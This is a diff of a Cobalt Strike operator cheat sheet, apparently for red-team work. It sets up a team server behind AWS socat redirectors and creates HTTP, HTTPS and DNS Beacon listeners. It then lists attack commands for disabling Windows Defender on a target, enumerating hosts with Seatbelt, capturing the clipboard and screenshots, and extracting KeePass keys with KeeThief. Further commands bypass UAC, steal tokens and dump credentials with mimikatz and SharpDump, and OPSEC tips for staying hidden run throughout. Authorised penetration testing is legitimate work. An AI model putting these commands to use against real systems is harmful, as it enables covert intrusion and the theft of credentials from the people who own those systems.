@@ -1,15 +1,9 @@
 Cobalt Strike
 
 Use the following install location: /opt/cobaltstrike/
-     This will allow you get get third-party apps installed when running update.sh
+     This will allow you to get third-party apps installed when running /opt/discover/update.sh
 
-OPSEC: Never allow direct internet access to your team server.
-
-ssh user@teamserver -L 50050:127.0.0.1:50050
-Start the client, set the host to 127.0.0.1
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
-Install or update
+Update
     cd /opt/cobaltstrike/
     ./update
 
@@ -19,27 +13,47 @@ Remove old data and Beacons (optional)
 
 Start the team server
     There are 2 mandotory parameters and 2 optional parameters. The first 2 parameters are required.
-    ./teamserver <IP> <password> <Malleable C2 profile> <kill date for Beacons yyyy-mm-dd>
+    ./teamserver <IP> <password> [Malleable C2 profile] [kill date for Beacons yyyy-mm-dd]
 
     ./teamserver 192.168.1.5 password malleable-c2-profiles/APT/etumbot.profile 2021-12-31
 
-    When the team server starts, it will display the SHA256 hash of the SSL cert. Send this hash to your team members.
+    When the team server starts, it will display the SHA256 hash of the SSL cert. Verify this hash when connecting.
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
-Login to the team server
+# Connecting to the team server
+
+- Locally
     Right-click in the Terminal > Split Terminal Horizontally
     cd /opt/cobaltstrike/
     ./cobaltstrike
-    Host: <127.0.0.1 if running locally or IP of remote team server>
+    Host: 127.0.0.1
     Port: 50050
     User: <your name>
-    Password: <password you entered above>
+    Password: <password you entered from above>
     Connect
-    VerifyFingerprint (SHA256 hash) > Yes
+    VerifyFingerprint (SHA256 hash from above) > Yes
+
+- Remote connection
+    OPSEC: Never allow a client to make direct connections to your team server. Always use SSH and locally forward the connection.
+    ssh user@teamserver -L 50050:127.0.0.1:50050
+    Follow the steps from above.
+------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Redirectors
+
+OPSEC: Never allow a Beacon to make direct connections to your team server. Always use a redirector to forward the traffic.
+
+Create 3 free Ubuntu instances in AWS. These instances will be used for the following:
+    Redirector1 - HTTP
+    Redirector2 - HTTPS
+    Redirector3 - DNS
+
+Install socat on each instance: sudo apt install socat
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Valid SSL Certificate for Beacon 
 
-Create a Java Keystore file. Use the fully qualified domain name to your Beacon server.
+Create a Java Keystore file. Use the fully qualified domain name of your Beacon server.
 keytool -genkey -keyalg RSA -keysize 2048 -keystore domain.store
 
 Generate a Certificate Signing Request (CSR). Submit this file to your SSL certificate vendor. 
@@ -55,39 +69,28 @@ keytool -import -trustcacerts -alias mykey -file domain.crt -keystore domain.sto
 Cobalt Strike expects to find the Java Keystore file in the same folder as your Malleable C2 profile.
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# Redirectors
-
-Create 3 free Ubuntu instances in AWS. These instances will be used for the following:
-    Redirector1 - HTTP
-    Redirector2 - HTTPS
-    Redirector3 - DNS
-    
-Install socat on each instance.
-sudo apt install socat
-------------------------------------------------------------------------------------------------------------------------------------------------------
-
 # Create Listeners
 
 Cobalt Strike > Listeners > Add
-Name: DNS
-Payload: Beacon DNS
-DNS Hosts: click + <Redirector1 IP>
-OK > Save > OK
-
-Add
 Name: HTTP
 Payload: Beacon HTTP
-HTTP Hosts: click + <Redirector2 IP>
-HTTP Host (Stager): <Redirector2 IP>
+HTTP Hosts: click + <Redirector1 IP>
+HTTP Host (Stager): <Redirector1 IP>
 HTTP Port (C2): 80
 OK > Save > OK
 
 Add
 Name: HTTPS
 Payload: Beacon HTTPS
-HTTPS Hosts: click + <Redirector3 IP>
-HTTP Host (Stager): <Redirector3 IP>
-HTTP Port (C2): 443
+HTTPS Hosts: click + <Redirector2 IP>
+HTTPS Host (Stager): <Redirector2 IP>
+HTTPS Port (C2): 443
+OK > Save > OK
+
+Add
+Name: DNS
+Payload: Beacon DNS
+DNS Hosts: click + <Redirector3 IP>
 OK > Save > OK
 
 Add
@@ -99,8 +102,8 @@ Save > OK
 # Launch an attack to gain a foothold.
 
 OPSEC: Staged payloads are typically less secure.
-Always prefer a fully staged/stageless payload and disable payload staging.
-When you see (S) in the framwork, it refers to a stageless payload.
+    Always prefer a fully staged or stageless payload and disable payload staging.
+    When you see (S) in the framwork, it refers to a stageless payload.
 
 Disable Windows Defender on your target Windows VM.
     Enterprise: Windows Security > Virus & threat protection > Manage settings > turn off Real-time protection > Yes
@@ -193,7 +196,8 @@ ctrl+k will clear the current window.
 
 # Enumeration
 
-Seatbelt					  Part of https://github.com/Flangvik/SharpCollection
+Seatbelt
+Part of https://github.com/Flangvik/SharpCollection
 execute-assembly /opt/Seatbelt.exe -group=system
 execute-assembly /opt/Seatbelt.exe -group=user
 
@@ -206,7 +210,8 @@ psinject <PID> x64 Start-ClipboardMonitor -CollectionLimit 5
 screenshot <PID> x64                              Take a screenshot
                                                   View > Screenshots > select item in lower left pane
 
-KeeThief					  https://github.com/GhostPack/KeeThief
+KeeThief
+https://github.com/GhostPack/KeeThief
 powershell Get-KeePassDatabaseKey
 
 Cobalt Strike > Script Manger > Load > /opt/cobaltstrike/third-party/trustedsec-bof/SA/SA.cna
@@ -298,14 +303,16 @@ run sc start VulnSvc                              Start the service.
 You should now have a new Beacon.
 ----------------------------------------------
 
-SharpUp is a C# port of PowerUp			  Part of https://github.com/Flangvik/SharpCollection
+SharpUp is a C# port of PowerUp
+Part of https://github.com/Flangvik/SharpCollection
 Not all checks are ported.
 execute-assembly /opt/GhostPack/SharpUp/SharpUp.exe
 
 elevate uac-token-duplication                     Bypass UAC, this gives you a pseudo-high integrity token
 elevate svc-exe                                   Creates a SYSTEM service that will run our payload
 
-https://github.com/rasta-mouse/Watson		  Part of https://github.com/Flangvik/SharpCollection
+https://github.com/rasta-mouse/Watson
+Part of https://github.com/Flangvik/SharpCollection
 
 Cobalt Strike > Script Manger > Load > /opt/cobaltstrike/elevatekit/elevate.cna
 elevate or runasadmin                             New commands are added
@@ -327,7 +334,8 @@ steal_token <PID>
 
 mimikatz !lsadump::sam
 
-SharpDump					  Part of https://github.com/Flangvik/SharpCollection
+SharpDump
+Part of https://github.com/Flangvik/SharpCollection
 
 execute-assembly /opt/Seatbelt.exe LSASettings
 execute-assembly /opt/Seatbelt.exe CredGuard
